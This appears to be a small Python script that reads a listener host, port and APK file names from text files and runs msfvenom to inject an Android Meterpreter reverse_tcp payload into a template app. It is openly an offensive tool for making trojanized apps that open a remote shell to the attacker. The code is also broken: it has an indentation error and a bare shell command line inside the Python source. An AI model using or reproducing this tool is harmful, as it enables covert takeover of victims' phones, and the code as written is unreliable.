import os
with open('lhost.txt', 'r') as myfile:
  lhost = myfile.read()
with open('lport.txt', 'r') as myfile:
  lport = myfile.read()
with open('outn.txt', 'r') as myfile:
  outn = myfile.read()
  with open('inn.txt', 'r') as myfile:
  inn = myfile.read()
msfvenom -x $template_name -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output_name
cmd = "msfvenom -x "+inn+" -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -o "+outn
os.system(cmd)